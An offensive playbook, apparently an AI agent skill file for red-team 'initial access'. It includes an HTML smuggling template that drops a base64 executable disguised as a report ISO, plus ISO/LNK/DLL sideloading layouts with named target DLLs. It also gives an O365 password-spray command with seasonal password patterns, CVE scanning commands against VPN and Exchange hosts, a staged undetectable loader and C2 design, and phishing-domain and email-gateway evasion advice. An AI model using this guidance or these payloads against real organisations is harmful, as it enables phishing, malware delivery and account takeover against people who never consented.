---
name: initial-access
description: Modern initial access techniques — phishing, payload delivery, HTML smuggling, ISO/IMG bypass, supply chain attacks, credential stuffing, exposed service exploitation
metadata:
  type: offensive
  phase: initial-access
  mitre: TA0001
---

# Initial Access

## When to Activate

- Planning initial access phase of red team engagement
- Developing phishing campaigns and payload delivery
- Bypassing email gateways and endpoint protection
- Exploiting exposed services for initial foothold

## Attack Vectors

### Email-Based (Phishing)

**Payload Delivery Formats** (bypass probability):
- `.exe` — almost always blocked
- `.iso/.img` — bypasses MOTW (Mark of the Web) on older Windows
- `.html` (smuggling) — high success rate
- `.pdf` with embedded JS — moderate
- `.one` (OneNote) — effective until patched
- `.lnk` + DLL sideload — high success in ISO container
- `.pptm/.ppsm/.accde` — often not covered by default protection

**Domain Preparation**:
- Domain age > 2 weeks (warm up with legitimate emails first)
- Use HTTPS with valid certificate
- Category: business/technology (not "newly registered")
- SPF, DKIM, DMARC properly configured
- Send legitimate emails first to build reputation

### HTML Smuggling

```html
<!-- Construct binary blob in JavaScript, trigger download -->
<html>
<body>
<script>
function smuggle() {
    var bin = atob("TVqQAAMAAAAEAAAA..."); // base64 PE
    var blob = new Blob([new Uint8Array([...bin].map(c=>c.charCodeAt(0)))], 
                        {type: 'application/octet-stream'});
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'Report_Q4_2026.iso';
    a.click();
}
smuggle();
</script>
<p>Loading document...</p>
</body>
</html>
```

### ISO/IMG Container (MOTW Bypass)

```
# Structure inside ISO:
├── Report.lnk          # Shortcut that executes the DLL
├── legitimate.exe      # Signed binary vulnerable to DLL sideload
└── payload.dll         # Malicious DLL loaded by legitimate.exe

# LNK target: legitimate.exe (which loads payload.dll from same directory)
# Files inside ISO don't inherit MOTW → bypass SmartScreen
```

**Note**: Windows 11 22H2+ propagates MOTW into ISO contents. Use alternative containers or delivery methods for newer targets.

### OneNote (.one) Payload

```
# Embed .bat/.hta behind fake "Double click to view" image
# User double-clicks → executes embedded script
# Effective because OneNote files are rarely blocked by email gateways
```

### DLL Sideloading

```bash
# Find legitimate signed EXE that loads DLL from CWD:
# 1. Use Process Monitor: filter for NAME NOT FOUND on DLL loads
# 2. Common targets: teams.exe (ffmpeg.dll), onedrive, slack
# 3. Place malicious DLL alongside legitimate EXE in delivery package

# Popular sideload targets:
# - Microsoft Teams: ffmpeg.dll
# - OneDrive: secur32.dll
# - Slack: libEGL.dll
# - VS Code: wlanapi.dll (portable mode)
```

## Credential-Based Access

### Credential Stuffing
```bash
# Use breach databases to test against target services
# Tools: Hydra, Burp Intruder, custom scripts
# Targets: VPN portals, OWA, O365, Citrix, RDP

# O365 password spray (avoid lockout: 1 attempt per user per hour)
# Tools: MSOLSpray, Ruler, MailSniper
python3 msolspray.py --userlist users.txt --password 'Company2026!' --url https://login.microsoftonline.com

# Common patterns to try:
# Season+Year: Summer2026!, Winter2025!
# Company+digits: CompanyName1!, Corp2026#
# Month+Year: May2026!, January2026!
```

### Exposed Service Exploitation
```bash
# VPN (Fortinet, Pulse Secure, Citrix, Palo Alto)
# Check for known CVEs: CVE-2023-27997 (Fortinet), CVE-2024-3400 (PAN-OS)
searchsploit fortinet
nuclei -u https://vpn.target.com -t cves/ -severity critical

# Exchange (ProxyShell, ProxyNotShell, OWASSRF)
# RDP (BlueKeep CVE-2019-0708 for legacy)
# Jenkins, GitLab, Confluence (common RCE CVEs)
```

### Supply Chain
```
# Compromise trusted software update mechanism
# Inject into CI/CD pipeline
# Typosquatting on package managers (npm, PyPI)
# Compromise developer workstation → push malicious commit
```

## Staged Payload Architecture

```
Stage 0 (Loader) — extremely light (<30KB), FUD
├── Self-contained, no external dependencies
├── Only job: download/extract/inject Stage 1
├── NOT .exe (use .dll sideload, .hta, .lnk+script)
└── Must bypass email gateway + endpoint AV

Stage 1 (Minimal Implant) — lightweight C2
├── 5-6 commands: ls, whoami, pwd, download, upload, execute
├── Persistent (registry, scheduled task)
├── FUD (may touch disk)
└── Used to deploy Stage 2 after recon

Stage 2 (Full C2) — Cobalt Strike, Sliver, Havoc
├── Full post-exploitation capability
├── In-memory only (never written to disk)
├── Deployed after AV/EDR assessment
└── Replace Stage 1 persistence with Stage 2
```

## OPSEC for Initial Access

- Warm up phishing domain 2+ weeks before engagement
- Use legitimate email services (O365, Google Workspace) for sending
- Limit number of GET elements and parameter names in URLs
- Test payload against target's email gateway (if possible, get sample config)
- Use HTTPS for all payload hosting
- Kill date on all payloads (auto-destruct after engagement window)
- Separate infrastructure per engagement phase (phishing ≠ C2)
- Monitor for blue team interaction with your infrastructure

## Delivery Alternatives

```
# QR code to attacker-controlled site (bypasses email URL scanning)
# Legitimate file-sharing links (OneDrive, Google Drive, Dropbox)
# Vishing (voice phishing) → guide target to download payload
# USB drop (physical access scenarios)
# Watering hole (compromise site frequented by targets)
# LinkedIn/social media DM with "job offer" document
```
